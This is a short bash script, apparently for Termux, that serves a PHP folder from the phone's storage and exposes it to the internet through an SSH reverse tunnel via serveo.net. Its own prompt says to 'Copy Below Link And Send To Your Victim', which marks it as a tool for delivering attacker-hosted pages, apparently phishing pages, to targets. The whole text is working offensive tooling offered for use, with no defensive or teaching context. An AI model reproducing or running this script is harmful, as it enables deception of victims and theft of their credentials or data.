clear
echo -e "\e[0m\e[1m"
ifconfig
echo -e "\e[1m\e[33m\nWhat is Your Dynamic \e[31mIP \e[33m\e[32m : \n\n"
read varip
echo
echo -e "\e[1m\e[33m\nWhat is Your \e[31mPort (\e[36meg., 4444\e[31m)\e[33m\e[32m : \n\n"
read varport
clear
echo
cd
cd T-Host
echo >> start.sh
chmod +x start.sh
echo " php -S $varip:$varport -t /sdcard/php" >> /data/data/com.termux/files/home/T-Host/start.sh
echo
echo
echo
echo
echo
echo -e "\e[1m\e[33m Open \e[32mNew Session\e[33m And Open \e[32mT-Host\e[33m folder & Run\e[32m bash start.sh \n\n \e[36m\t    Don't Close This Window...!!!!"
sleep 5
echo
echo
echo -e "\e[0m \e[1m\tCopy Below Link And Send To Your Victim..!"
sleep 2
echo
echo
echo
ssh -R 80:$varip:$varport serveo.net
echo
echo
